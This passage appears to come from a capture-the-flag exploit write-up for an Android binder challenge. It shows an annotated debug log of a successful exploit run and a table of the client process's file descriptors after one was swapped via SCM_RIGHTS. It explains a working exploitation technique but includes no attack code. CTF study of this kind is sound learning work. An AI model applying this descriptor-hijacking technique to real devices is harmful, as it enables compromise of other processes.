[DBG] recv 5 bytes: '4 ok\n'     ← client wrote COMMIT reply to fd=5=udp_client (fd swap ✓)
[DBG] recv 17 bytes: '0 failed invalid\n'  ← client received GROOM\n on UDP, responded ✓
[+] client groom reply = 0 failed invalid   ← matches "0 " prefix → SUCCESS
binder: undelivered TRANSACTION_COMPLETE    ← TX1 reply never read (solver exited) — benign
Kernel panic ... exitcode=0x00000000        ← solver returned 0 = CTF VM normal exit
```

### Fd layout at success point (inside client process)

| fd | File |
|----|------|
| 0 | stdin |
| 1 | stdout |
| 2 | stderr |
| 3 | /dev/binder |
| 4 | memfd "mte-client-shared" |
| 5 | **udp_client** ← was conn_fd, replaced by SCM_RIGHTS |
| 6 | spair[1] |
| 7 | replacement_fd (MIKU memfd) |
| 8..20 | /dev/null × 13 |
